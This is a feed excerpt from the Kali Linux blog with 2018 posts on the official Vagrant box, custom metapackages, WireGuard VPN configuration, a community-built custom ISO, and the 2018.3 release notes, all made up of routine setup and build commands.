<description><p>Inspired by a recent <a href="https://blog.secureideas.com/2018/09/automating-red-team-homelabs-part-1-kali-automation.html">community blog post</a>, we have decided to add a new official way for our community to use Kali. Starting now, you can find an officially maintained Kali Linux image in the <a href="https://app.vagrantup.com/">Vagrant Cloud</a>.</p> <h2 id="what-is-vagrant">What is Vagrant?</h2> <p>From Vagrant&rsquo;s <a href="https://www.vagrantup.com/">website</a>:</p> <blockquote> <p>Vagrant is a tool for building and managing virtual machine environments in a single workflow.</p> </blockquote> <p>Put simply, with a single configuration file, you can download a base &ldquo;box&rdquo; and apply additional configurations like adding an additional network interface, setting the number of CPU cores and memory, or running a script on first boot. Even more importantly, all of this is contained in a configuration file, which is very easy to share compared to a virtual machine that spans many gigabytes.</p> <h3 id="getting-started">Getting Started</h3> <p>To get started, first install <a href="https://www.vagrantup.com/">Vagrant</a> and <a href="https://www.virtualbox.org/">VirtualBox</a>. Then create an empty directory and from there run the following command:</p> <pre><code class="language-console">$ vagrant init kalilinux/rolling A `Vagrantfile` has been placed in this directory. You are now ready to `vagrant up` your first virtual environment! Please read the comments in the Vagrantfile as well as documentation on `vagrantup.com` for more information on using Vagrant. </code></pre> <p>This will create a file named <strong><em>Vagrantfile</em></strong>, which contains all the configuration options for the virtual machine. Every &lsquo;vagrant&rsquo; command must be run from the directory containing that file. By default, it contains only the box name as well as many commented common options. We&rsquo;ll review some of those later, but here is an excerpt:</p> <pre><code class="language-console">$ cat Vagrantfile # -*- mode: ruby -*- # vi: set ft=ruby : # All Vagrant configuration is done below. The &quot;2&quot; in Vagrant.configure # configures the configuration version (we support older styles for # backwards compatibility). Please don't change it unless you know what # you're doing. Vagrant.configure(&quot;2&quot;) do |config| # The most common configuration options are documented and commented below. # For a complete reference, please see the online documentation at # https://docs.vagrantup.com. # Every Vagrant development environment requires a box. You can search for # boxes at https://vagrantcloud.com/search. config.vm.box = &quot;kalilinux/rolling&quot; ... # Create a forwarded port mapping which allows access to a specific port # within the machine from a port on the host machine. In the example below, # accessing &quot;localhost:8080&quot; will access port 80 on the guest machine. # NOTE: This will enable public access to the opened port # config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 8080 ... end </code></pre> <p>Next, make sure you have enough disk space. The vagrant &ldquo;box&rdquo; (you can think of it as a template) uses around 4GB, and the spun up VM will take around 10GB or more depending on what you install inside. Then run this command:</p> <pre><code class="language-console">$ vagrant up Bringing machine 'default' up with 'virtualbox' provider... ==&gt; default: Box 'kalilinux/rolling' could not be found. Attempting to find and install... default: Box Provider: virtualbox default: Box Version: &gt;= 0 ==&gt; default: Loading metadata for box 'kalilinux/rolling' default: URL: https://vagrantcloud.com/kalilinux/rolling ==&gt; default: Adding box 'kalilinux/rolling' (v2018.3.1) for provider: virtualbox default: Downloading: https://vagrantcloud.com/kalilinux/boxes/rolling/versions/2018.3.1/providers/virtualbox.box ... ==&gt; default: Machine booted and ready! ==&gt; default: Checking for guest additions in VM... ==&gt; default: Mounting shared folders... default: /vagrant =&gt; /Users/woodbine/vagrant-boxes/kali </code></pre> <p>Vagrant will first download the box file if it&rsquo;s not in its cache, then create the Kali VM and power it on. You will see the VirtualBox UI pop up so you can use Kali normally with the <strong>root/toor</strong> credentials. Vagrant veterans might notice that the VM is not headless, unlike most other Vagrant boxes. We have decided to show the GUI by default because many Kali tools require it. If you do not need the GUI, you can disable it in the <strong><em>Vagrantfile</em></strong> (see below for an example config) and run the following command to SSH to the machine as the <strong>vagrant</strong> user:</p> <pre><code class="language-console">$ vagrant ssh Linux kali 4.18.0-kali1-amd64 #1 SMP Debian 4.18.6-1kali1 (2018-09-10) x86_64 The programs included with the Kali GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. vagrant@kali:~$ </code></pre> <p>This user has password-less sudo configured with the password <strong>vagrant</strong>, as per Vagrant conventions.</p> <h3 id="configuration">Configuration</h3> <p>The VM comes with a NAT interface pre-configured, so you don&rsquo;t need to edit the configuration to have Internet access from inside the VM. In addition, Vagrant will create a shared folder by default: the current directory on the host (the one containing the <strong><em>Vagrantfile</em></strong>) is available in the <strong><em>/vagrant</em></strong> directory of the guest. This directory allows you to keep data saved on the host, but easily accessible by the guest. This is a good practice, as it would allow you to quickly reset your Vagrant machine and never lose data.</p> <p>Let&rsquo;s see what more we can do with just a little configuration:</p> <pre><code class="language-ruby"># -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(&quot;2&quot;) do |config| config.vm.box = &quot;kalilinux/rolling&quot; # Create a forwarded port config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 8080 # Create a private network. In VirtualBox, this is a Host-Only network config.vm.network &quot;private_network&quot;, ip: &quot;192.168.33.10&quot; # VirtualBox specific settings config.vm.provider &quot;virtualbox&quot; do |vb| # Hide the VirtualBox GUI when booting the machine vb.gui = false # Customize the amount of memory on the VM: vb.memory = &quot;4096&quot; end # Provision the machine with a shell script config.vm.provision &quot;shell&quot;, inline: &lt;&lt;-SHELL apt-get update apt-get install -y crowbar SHELL end </code></pre> <p>Add/uncomment the options inside the <strong><em>Vagrantfile</em></strong> then restart the machine with the following command for your changes to take effect:</p> <pre><code class="language-sh">vagrant reload </code></pre> <p>The provision script will only be run the first time the machine boots, but you can use one of these commands to re-run it:</p> <pre><code class="language-sh">vagrant provision # Provision the powered on VM vagrant up --provision # When VM is powered off, power it on then provision vagrant reload --provision # Reboot the VM then provision </code></pre> <p>Note that while it is possible to add a bridged network (called a &ldquo;public network&rdquo; in Vagrant), this is likely a bad idea as Vagrant is <a href="https://www.vagrantup.com/docs/networking/public_network.html">insecure by default</a>.</p> <h3 id="wrapping-up">Wrapping Up</h3> <p>We hope you find this new offering useful. We have shown a few simple things that you can do with Vagrant, but make sure to check out the <a href="https://www.vagrantup.com/docs/">official documentation</a> for more configuration options and the <a href="https://app.vagrantup.com/">Vagrant Cloud</a> for more boxes!</p></description>
</item>
<item>
<title>Making your own Kali Linux Metapackages</title>
<link>https://www.kali.org/blog/making-your-own-kali-linux-metapackages/</link>
<guid isPermaLink="true">https://www.kali.org/blog/making-your-own-kali-linux-metapackages/</guid>
<pubDate>Tue, 18 Sep 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/making-your-own-kali-linux-metapackages/images/kali-advanced-package-management-2.jpg" type="image/jpg"/>
<description><p>One of the many useful things we can do with APT is create metapackages, which are effectively empty packages that declare a list of other packages as dependencies. Kali Linux includes metapackages for password cracking, software-defined radio, wireless, web applications, and more but if you have specific needs (like most people), it&rsquo;s quick and easy to define your own metapackages, which we will show in this post.</p> <p>Before we begin, we need to install the <strong><em>devscripts</em></strong> package, which includes a number of tools and utilities for package management:</p> <pre><code class="language-console">root@kali:~# apt install devscripts </code></pre> <p>In Kali, all metapackages are defined in the appropriately named <strong><em>kali-meta</em></strong> package so we can clone and modify it to suit our needs:</p> <pre><code class="language-console">root@kali:~# git clone git://gitlab.com/kalilinux/packages/kali-meta Cloning into 'kali-meta'... remote: Counting objects: 998, done. remote: Compressing objects: 100% (809/809), done. remote: Total 998 (delta 365), reused 0 (delta 0) Receiving objects: 100% (998/998), 179.90 KiB | 570.00 KiB/s, done. Resolving deltas: 100% (365/365), done. warning: remote HEAD refers to nonexistent ref, unable to checkout. </code></pre> <p>The &ldquo;unable to checkout&rdquo; message above looks worrisome but it only means that the default branch (kali/master) needs to be checked out first, which can be done as follows:</p> <pre><code class="language-console">root@kali:~# cd kali-meta/ root@kali:~/kali-meta# git checkout kali/master Branch 'kali/master' set up to track remote branch 'kali/master' from 'origin'. Switched to a new branch 'kali/master' root@kali:~/kali-meta# </code></pre> <p>To create a new metapackage (or update an existing one), we need to edit the <strong><em>debian/control</em></strong> file with the package information. Each metapackage is merely a comma-separated list of package dependencies, like the one for the <strong><em>kali-linux-gpu</em></strong> shown below:</p> <pre><code class="language-plain">Package: kali-linux-gpu Architecture: any Depends: ${misc:Depends}, kali-linux, oclhashcat [amd64 i386], pyrit, oclgausscrack [amd64 i386], truecrack, </code></pre> <p>Our new metapackage will be called &ldquo;kali-linux-mytools&rdquo; and will install Vagrant, VirtualBox, LibreOffice, and Chromium. Our entry for this metapackage in <strong><em>debian/control</em></strong> looks like this:</p> <pre><code class="language-console"> root@kali:~/kali-meta# tail -n 14 debian/control Package: kali-linux-mytools Architecture: any Depends: ${misc:Depends}, kali-linux, virtualbox, vagrant, libreoffice, chromium, Description: My required Kali tools This is Kali Linux, the most advanced penetration testing and security auditing distribution. . This metapackage depends on the tools I install most often. </code></pre> <p>With the new metapackage defined, we need to bump the version number with &lsquo;dch&rsquo; prior to building the package. This will launch an editor for you to enter the details of your changes in <strong><em>debian/changelog</em></strong>:</p> <pre><code class="language-console">root@kali:~/kali-meta# dch --local dookie root@kali:~/kali-meta# head -n 5 debian/changelog kali-meta (2018.3.2dookie1) UNRELEASED; urgency=medium * Added kali-linux-mytools -- dookie &lt;dookie@kali.local&gt; Tue, 11 Sep 2018 09:40:10 -0600 </code></pre> <p>Finally, we can proceed to build the new package with the &lsquo;dpkg-buildpackage&rsquo; command. Since metapackages are just lists of dependencies, the build process is very quick:</p> <pre><code class="language-console">root@kali:~/kali-meta# dpkg-buildpackage -us -uc -b dpkg-buildpackage: info: source package kali-meta dpkg-buildpackage: info: source version 2018.3.2dookie1 dpkg-buildpackage: info: source distribution UNRELEASED dpkg-buildpackage: info: source changed by dookie &lt;dookie@kali.local&gt; dpkg-buildpackage: info: host architecture amd64 ... dpkg-deb: building package 'kali-linux-pwtools' in '../kali-linux-pwtools_2018.3.2dookie1_amd64.deb'. dpkg-deb: building package 'kali-linux-top10' in '../kali-linux-top10_2018.3.2dookie1_amd64.deb'. dpkg-deb: building package 'kali-linux-mytools' in '../kali-linux-mytools_2018.3.2dookie1_amd64.deb'. dpkg-genbuildinfo --build=binary dpkg-genchanges --build=binary &gt;../kali-meta_2018.3.2dookie1_amd64.changes dpkg-genchanges: info: binary-only upload (no source code included) dpkg-source --after-build kali-meta dpkg-buildpackage: info: binary-only upload (no source included) </code></pre> <p>When the build is complete, our new metapackage can be installed with &lsquo;apt&rsquo; like any other package:</p> <pre><code class="language-console">root@kali:~/kali-meta# apt install ../kali-linux-mytools_2018.3.2dookie1_amd64.deb ... root@kali:~/kali-meta# apt-cache policy vagrant virtualbox libreoffice chromium vagrant: Installed: 2.1.2+dfsg-1 Candidate: 2.1.2+dfsg-1 Version table: *** 2.1.2+dfsg-1 500 500 http://192.168.86.4/kali kali-rolling/main amd64 Packages 100 /var/lib/dpkg/status virtualbox: Installed: 5.2.18-dfsg-2 Candidate: 5.2.18-dfsg-2 Version table: *** 5.2.18-dfsg-2 500 500 http://192.168.86.4/kali kali-rolling/contrib amd64 Packages 100 /var/lib/dpkg/status libreoffice: Installed: 1:6.1.1~rc1-2 Candidate: 1:6.1.1~rc1-2 Version table: *** 1:6.1.1~rc1-2 500 500 http://192.168.86.4/kali kali-rolling/main amd64 Packages 100 /var/lib/dpkg/status chromium: Installed: 68.0.3440.75-2 Candidate: 68.0.3440.75-2 Version table: *** 68.0.3440.75-2 500 500 http://192.168.86.4/kali kali-rolling/main amd64 Packages 100 /var/lib/dpkg/status </code></pre> <p>Just like that, we have our own metapackage that we can store on network share or some other location to quickly get our fresh Kali Linux installations set up and configured quickly.</p></description>
</item>
<item>
<title>WireGuard on Kali</title>
<link>https://www.kali.org/blog/wireguard-on-kali/</link>
<guid isPermaLink="true">https://www.kali.org/blog/wireguard-on-kali/</guid>
<pubDate>Tue, 11 Sep 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/wireguard-on-kali/images/wireguard-on-kali.jpg" type="image/jpg"/>
<description><p>We have been hearing a lot about <a href="https://www.wireguard.com/quickstart/">WireGuard</a> lately and with it being recently added to the Kali repos, we thought we would give it a quick try to see what all the fuss is about. All in all, we found this is a really nice and quick to configure VPN solution, and might be worth checking out.</p> <h2 id="getting-started">Getting Started</h2> <p>With WireGuard added to the repos, installation is nice and easy:</p> <pre><code class="language-sh">apt install wireguard resolvconf </code></pre> <p>And we are off. Next comes time for configuration. This is where WireGuard really shone for us, as it took next to nothing to get up and running.</p> <p>On the server, we have to generate a public/private key pair and set up an initial config file:</p> <pre><code class="language-sh">wg genkey | tee privatekey | wg pubkey &gt; publickey umask u=rwx,go= &amp;&amp; cat &gt; /etc/wireguard/wg0.conf &lt;&lt; EOF [Interface] Address = 10.222.222.1/24 SaveConfig = true ListenPort = 51820 PrivateKey = -SERVER PRIVATE KEY- [Peer] PublicKey = -CLIENT PUBLIC KEY- AllowedIPs = 10.222.222.2/32 EOF </code></pre> <p>And we do the same process on the client to establish its key pair and config:</p> <pre><code class="language-sh">wg genkey | tee privatekey | wg pubkey &gt; publickey umask u=rwx,go= &amp;&amp; cat /etc/wireguard/wg0.conf &lt;&lt; EOF [Interface] Address = 10.222.222.2/32 PrivateKey = -CLIENT PRIVATE KEY- DNS = 8.8.8.8 [Peer] PublicKey = -SERVER PUBLIC KEY- Endpoint = public.ip.of.server:51820 AllowedIPs = 0.0.0.0/0 PersistentKeepalive = 21 EOF </code></pre> <p>These are pretty simple configs but it&rsquo;s worth pointing a few things out. First off, you obviously have to put the output from the key pairs into the configs as appropriate. Additionally, the DNS line on the client is to help prevent DNS leaks from using your local default DNS server. You may or may not want to change that depending on your needs.</p> <p>Most important however is the &ldquo;AllowedIPs&rdquo; line. This will control what IPs do or don&rsquo;t go across the VPN. In this case, we setup the client to route everything through the VPN server. We will play with this more in a bit, but let&rsquo;s look at getting this basic config running.</p> <p>To start and stop the tunnel, it&rsquo;s pretty easy:</p> <pre><code class="language-sh"># The VPN can be enabled using wg-quick up wg0 # To disable the VPN: wg-quick down wg0 # Information about the connection can be retrieved with following command: wg show </code></pre> <p>And of course, we need to enable IP masquerade and IP forwarding on the server:</p> <pre><code class="language-sh">/sbin/iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE echo 1 &gt; /proc/sys/net/ipv4/ip_forward </code></pre> <p>So, with this we have a traditional VPN configuration. If you are looking to just get a standard VPN setup, at this point you are done. There are some advantages to this compared to using OpenVPN, for instance this solution seems to be much faster, the config is a lot simpler, and it&rsquo;s a touch more stealthy in that the server won&rsquo;t respond to packets that don&rsquo;t have a proper key pair linked to them. We thought however it might be interesting to change the configuration to reflect our <a href="https://www.offsec.com/kali-linux/kali-rolling-iso-of-doom/">ISO of Doom</a> config, having a client that will auto connect to the server on boot allowing the server to route through and access the client network.</p> <h2 id="wireguard-of-doom">WireGuard of DOOM!</h2> <p>First things first, on our client, let&rsquo;s quickly set up IP forwarding and masquerading:</p> <pre><code class="language-sh">/sbin/iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE echo 1 &gt; /proc/sys/net/ipv4/ip_forward </code></pre> <p>Great, with that done, we make a couple minor changes to our configs. First up, on the server we change the &ldquo;AllowedIPs&rdquo; line to have the private network on the report site. This would look like so:</p> <pre><code class="language-ini">[Interface] Address = 10.222.222.1/24 SaveConfig = true ListenPort = 51820 PrivateKey = -SERVER PRIVATE KEY- [Peer] PublicKey = -CLIENT PUBLIC KEY- AllowedIPs = 10.200.200.2/32, 192.168.2.0/24 </code></pre> <p>With that one line changed on the server, we then tweak the clients &ldquo;AllowedIPs&rdquo; line to remove the option to route everything to the VPN server:</p> <pre><code class="language-ini">[Interface] Address = 10.200.200.2/32 PrivateKey = -CLIENT PRIVATE KEY- DNS = 8.8.8.8 [Peer] PublicKey = -SERVER PUBLIC KEY- Endpoint = public.ip.of.server:51820 AllowedIPs = 10.200.200.0/24 PersistentKeepalive = 21 </code></pre> <p>And thats it!</p> <pre><code class="language-console">root@kali:~# ping 192.168.2.22 PING 192.168.2.22 (192.168.2.22) 56(84) bytes of data. 64 bytes from 192.168.2.22: icmp_seq=19 ttl=63 time=50.2 ms 64 bytes from 192.168.2.22: icmp_seq=20 ttl=63 time=53.4 ms 64 bytes from 192.168.2.22: icmp_seq=21 ttl=63 time=48.1 ms </code></pre> <p>Now the VPN server can access the subnets on the other side of the WireGuard VPN.</p> <h2 id="wrapping-up">Wrapping up</h2> <p>Time will tell if WireGuard replaces OpenVPN as the VPN of choice, or if the latest buzz is just excitement of using the newest toys. In any case, it&rsquo;s nice to have the ability to test it out, and use if it&rsquo;s a good fit. As we have seen here, it&rsquo;s definitely easy to setup, and relatively versatile in the user cases.</p></description>
</item>
<item>
<title>My Custom Kali Linux Distribution</title>
<link>https://www.kali.org/blog/my-custom-kali-linux-distribution/</link>
<guid isPermaLink="true">https://www.kali.org/blog/my-custom-kali-linux-distribution/</guid>
<pubDate>Wed, 05 Sep 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/my-custom-kali-linux-distribution/images/my-custom-kali-live-build.jpg" type="image/jpg"/>
<description><p>We love it when community members come up with new ideas or interesting builds, and this one caught our attention. Jacek Kowalczyk hit us up on twitter with a really interesting story. His approach to tweaking Kali to be specific to his needs is exactly why this feature is so important to us and we wanted to share his story more widely.</p> <p>Jacek&rsquo;s live-build recipe was for a lightweight version of Kali using his favourite desktop environments, including some nice desktop configurations. We thought it would be best to let Jacek share his process with you step by step, in his own words:</p> <hr> <h2 id="jaceks-story">Jacek&rsquo;s Story</h2> <p>I spent a lot of time on searching for a Linux distribution that was best suited for my needs. I wanted a very lightweight system and went about testing a ton of variants (Manjaro, Debian, Ubuntu, Sparky, MX Linux, Antix, Arch, Anarchy, Antergos, Archlabs, Bunsen Labs, and many more). I also tested different desktop environments trying to find my right fit (Xfce, LXDE, Mate, LXqt, i3, openbox, fluxbox, jwm, and IceWM). Despite this exhaustive testing, I still wasn&rsquo;t satisfied.</p> <p>It started to become clear that for my needs, I needed a rolling release Linux that was not only lightweight, but also had good support from either a company or community. I made a long list of my favourite Linux distributions, but I still couldn&rsquo;t decide.</p> <p>I had always wanted to take part in an Open-source project and do a little development. It occurred to me that my solution could be to simply create my own setup&ndash;I could take a Linux distro, install a base OS, and customize it. At first, this seemed like a great option. But what would happen if I needed to reinstall? I didn&rsquo;t want to have to start over again on customizing my installed system.</p> <p>I knew I wanted to create an ISO that I could use to install my system anytime, anywhere. It would be perfectly customized for my needs fresh out of install. Because of this, I started to look for ways of customizing Debian, Arch, or Manjaro. This led me to the Kali Linux live-build config scripts. At this point, I knew I had found my solution.</p> <p>Kali Linux is a rolling distro based on Debian and has great support from the OffSec team as well as an active community. I also found existing scripts for i3wm provided by the Kali team. This was my starting point. I started playing with the custom packages list and later on with some chroot files to be included in the ISO. In this process, I generated over 20 ISO images until I had one I was happy with. Even now, I am still continuing to improve on it.</p> <p>Let me explain how I created two variants of Kali Linux&ndash;one with i3wm and one with Openbox window manager.</p> <p><p> <a href='https://www.kali.org/blog/my-custom-kali-linux-distribution/images/screenshots_2018-09-04-170842_scrot.png'> <img src="https://www.kali.org/blog/my-custom-kali-linux-distribution/images/screenshots_2018-09-04-170842_scrot.png" alt="" /> </a> </p> </p> <h3 id="custom-kali-linux-with-i3wm-or-openbox">Custom Kali Linux with i3wm or Openbox</h3> <p>I did my first setup based on the official Kali documentation for <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/">live-build-config</a>. This process was:</p> <ol> <li>Install Kali Linux. Use any official Kali image.</li> <li>Install additional packages.</li> <li>Start hacking i3wm/Openbox variants. I treated these as two separate builds initially, to keep things cleaner for myself. I was doing double the work, but it was easier to track:</li> </ol> <pre><code class="language-console">root@kali:~# apt install curl git live-build cdebootstrap root@kali:~# git clone git://gitlab.com/kalilinux/build-scripts/live-build-config.git ... root@kali:~# cd live-build-config/kali-config root@kali:~/live-build-config/kali-config# ls common variant-e17 variant-i3wm variant-light variant-mate variant-default variant-gnome variant-kde variant-lxde variant-xfce </code></pre> <p>For i3, I started with making my modifications in the existing <strong><em>variant-i3wm</em></strong> folder. For Openbox, I copied the <strong><em>variant-i3wm</em></strong> directory to <strong><em>variant-openbox</em></strong> and added my modifications to it:</p> <pre><code class="language-console">root@kali:~/live-build-config/kali-config# cp -r variant-i3wm variant-openbox </code></pre> <p>With that in place, the next step was to edit the file <strong><em>kali-config//package-lists/kali.list.chroot</em></strong> to add the required packages I wanted. My list of packages for i3wm can be found <a href="https://gitlab.com/jacekkowalczyk82/my-debian/variant-i3wm/package-lists/kali.list.chroot">here</a>, and Openbox <a href="https://gitlab.com/jacekkowalczyk82/my-debian/package-lists/kali.list.chroot">here</a>. All config files for the livecd should be copied to <strong><em>kali-config/common/includes.chroot/root/</em></strong>. This directory is used as the livecd environment is running as the root user.</p> <p>All config files for the installed file system should be copied to <strong><em>kali-config/common/includes.chroot/etc/skel/</em></strong>. The <strong><em>/etc/skel</em></strong> directory is commonly used as a template for creating user home directories, so every new user will by default have the files that are located in this directory.</p> <p>Nitrogen is an application used to setup wallpaper. The file <strong><em>.config/nitrogen/bg-saved.cfg</em></strong> defines the set wallpaper. The second file <strong><em>.config/nitrogen/nitrogen.cfg</em></strong> is the main configuration file for nitrogen and defines the directories where the wallpaper images are located. I tweaked each of these out to fit my preferences. With that in place, I then also tweaked the power manager applet by configuring <strong><em>.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-power-manager.xml</em></strong>.</p> <p>Additionally, I made a range of other customizations to personalize the system a bit more. Without going into too much detail, they were:</p> <ul> <li> <p>For i3wm</p> <ul> <li> <p><strong><em>kali-config/common/includes.chroot/root/.i3wm_conkyrc</em></strong> - Configuration for conky tool. This conkyrc file is based on the conky configuration from <a href="https://sparkylinux.org/">Sparky Linux</a></p> </li> <li> <p><strong><em>kali-config/common/includes.chroot/root/.config/i3/config</em></strong> - The configuration file for i3wm was generated for me on the fist login to i3wm session, and I added a few changes to autostart other tools like: nitrogen, clipit, volume control, and defined my key bindings for my tools and actions (poweroff and reboot).</p> </li> </ul> </li> <li> <p>For Openbox</p> <ul> <li> <p><strong><em>kali-config/common/includes.chroot/root/.openbox_conkyrc</em></strong> - configuration for conky. The openbox conkyrc is a different from the one for i3wm. This one is based on the conkyrc file from <a href="https://crunchbangplusplus.org/">CrunchBang++</a>.</p> </li> <li> <p><strong><em>kali-config/common/includes.chroot/root/.config/openbox/autostart</em></strong> - Openbox autostart file defines which tools and applications should be started automatically with openbox session: (nitrogen, clipit, volume vontrol, power manager, conky). I based it on the file from CrunchBang++ also.</p> </li> <li> <p><strong><em>kali-config/common/includes.chroot/root/.config/openbox/menu.xml</em></strong> - This is the Openbox menu config, controlling what happens when you right-click on the desktop. Openbox is really unique in that this file is completely user controlled and you can run scripts in it and do other things like starting applications or even to view the status the media player application in dynamic pipe menu. Openbox is really powerful.</p> </li> <li> <p><strong><em>kali-config/common/includes.chroot/root/.config/openbox/rc.xml</em></strong> - Openbox window manager themes and keybindings. This is pretty stock, but I added there my keybindings for my favourite tools and actions like poweroff and reboot.</p> </li> <li> <p><strong><em>kali-config/common/includes.chroot/root/.config/tint2/tint2rc</em></strong> - Tint2 panel settings and launchers. Here, I added my most commonly used tools: terminal, editors, web browsers. To edit this file I used tint2conf gui application. This application allows to easily define the themes of the tint2 panel and add launchers and other items of the panel.</p> </li> </ul> </li> </ul> <p>All the changes for i3wm can be found <a href="https://gitlab.com/jacekkowalczyk82/my-debian/i3/etc/skel/">here</a> and Openbox can be found <a href="https://gitlab.com/jacekkowalczyk82/my-debian/openbox/etc/skel/">here</a>.</p> <p>I also added the Firefox developer edition browser by downloading the install package and unpacking it into <strong><em>kali-config/common/includes.chroot/opt/firefox/</em></strong> and then added the toxic tox client to <strong><em>kali-config/common/includes.chroot/opt/toxic</em></strong>. To start up Firefox, I added also the shell script <strong><em>kali-config/common/includes.chroot/usr/bin/firefox.sh</em></strong>:</p> <pre><code class="language-bash">#!/bin/bash echo &quot;Starting firefox developer edition&quot; /opt/firefox/firefox </code></pre> <ol> <li>Build the ISOs</li> </ol> <p>With all that configuration out of the way, it was time for the fun part, building the ISOs!</p> <pre><code class="language-console">root@kali:~/live-build-config/kali-config# ./build.sh --distribution kali-rolling --variant i3wm --verbose root@kali:~/live-build-config/kali-config# ./build.sh --distribution kali-rolling --variant openbox --verbose </code></pre> <p>With those running, I then just had to wait for the job to finish. In my case it took about 3 hours. The ISO files it generated were saved in the <strong><em>images</em></strong> subfolder.</p> <h3 id="final-version">Final Version</h3> <p>In the final version of the configs, I decided to port my i3wm install to my Openbox build. This way, when building the Openbox config, I am getting both window managers, Openbox and i3. On the login screen, I can select the session I want. Obviously, its much easier to have one &ldquo;perfect&rdquo; ISO than have to decide between the two at install time.</p> <hr> <h2 id="wrapping-up">Wrapping up</h2> <p>We loved Jacek&rsquo;s approach of identifying his needs, and then not being afraid of just jumping in and making the changes. Like many things on Linux, doing a custom install can be intimidating and look like a very complex process. But once you get in and start the process, it&rsquo;s really pretty straightforward and the amount of work it can save you is amazing.</p> <p>Thanks to Jacek for all his hard work, and being willing to share it with the community. You can see what else Jacek is up to at his page at <a href="https://gitlab.com/jacekkowalczyk82">his GitLab page</a>.</p></description>
</item>
<item>
<title>Kali Linux 2018.3 Release</title>
<link>https://www.kali.org/blog/kali-linux-2018-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2018-3-release/</guid>
<pubDate>Tue, 21 Aug 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2018-3-release/images/kali-release.jpg" type="image/jpg"/>
<description><p>Another edition of Hacker Summer Camp has come and gone. We had a great time meeting our users, new and old, particularly at our Black Hat and DEF CON Dojos, which were led by our great friend <a href="https://twitter.com/ihackstuff">@ihackstuff</a> and the rest of the <a href="https://www.offsec.com/">OffSec</a> crew. Now that everyone is back home, it&rsquo;s time for our third Kali release of 2018, which is available for immediate <a href="https://www.kali.org/get-kali/">download</a>.</p> <p>Kali 2018.3 brings the kernel up to version 4.17.0 and while 4.17.0 did not introduce many changes, 4.16.0 had a huge number of additions and improvements including more Spectre and Meltdown fixes, improved power management, and better GPU support.</p> <h3 id="new-tools-and-tool-upgrades">New Tools and Tool Upgrades</h3> <p>Since our last release, we have added a number of new tools to the repositories, including:</p> <ul> <li><strong><a href="https://pkg.kali.org/pkg/idb">idb</a></strong> - An iOS research / penetration testing tool</li> <li><strong><a href="https://pkg.kali.org/pkg/gdb-peda">gdb-peda</a></strong> - Python Exploit Development Assistance for GDB</li> <li><strong><a href="https://pkg.kali.org/pkg/datasploit">datasploit</a></strong> - OSINT Framework to perform various recon techniques</li> <li><strong><a href="https://pkg.kali.org/pkg/kerberoast">kerberoast</a></strong> - Kerberos assessment tools</li> </ul> <p>In addition to these new packages, we have also upgraded a number of tools in our repos including <a href="https://www.kali.org/tools/aircrack-ng/">aircrack-ng</a>, <a href="https://www.kali.org/tools/burpsuite/">burpsuite</a>, <a href="https://www.kali.org/tools/gvm/">openvas</a>, <a href="https://www.kali.org/tools/wifite/">wifite</a>, and <a href="https://www.kali.org/tools/wpscan/">wpscan</a>. For the complete list of updates, fixes, and additions, please refer to the <a href="https://bugs.kali.org/changelog_page.php">Kali Bug Tracker Changelog</a>.</p> <h3 id="download-kali-linux-20183">Download Kali Linux 2018.3</h3> <p>If you would like to check out this latest and greatest Kali release, you can find download links for ISOs and Torrents on the <a href="https://www.kali.org/get-kali/">Kali Downloads</a> page along with links to the OffSec virtual machine and ARM images, which have also been updated to 2018.3. If you already have a Kali installation you&rsquo;re happy with, you can easily upgrade in place as follows:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y full-upgrade </code></pre> <h4 id="making-sure-you-are-up-to-date">Making sure you are up-to-date</h4> <p>To double check your version, first make sure your Kali <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">package repositories</a> are correct:</p> <pre><code class="language-console">root@kali:~# cat /etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free </code></pre> <p>Then after running <strong>apt -y full-upgrade</strong>, you may require a <strong>reboot</strong> before checking:</p> <pre><code class="language-console">root@kali:~# grep VERSION /etc/os-release VERSION=&quot;2018.3&quot; VERSION_ID=&quot;2018.3&quot; </code></pre> <p>If you come across any bugs in Kali, please open a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. It&rsquo;s more than a little challenging to fix what we don&rsquo;t know about.</p></description>
</item>
<item>
<title>Build Kali with Live-Build on Debian Based Systems</title>
<link>https://www.kali.org/blog/build-kali-with-live-build-on-debian-based-systems/</link>
<guid isPermaLink="true">https://www.kali.org/blog/build-kali-with-live-build-on-debian-based-systems/</guid>
<pubDate>Wed, 18 Jul 2018 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/build-kali-with-live-build-on-debian-based-systems/images/kali-livebuild-debian-1.jpg" type="image/jpg"/>
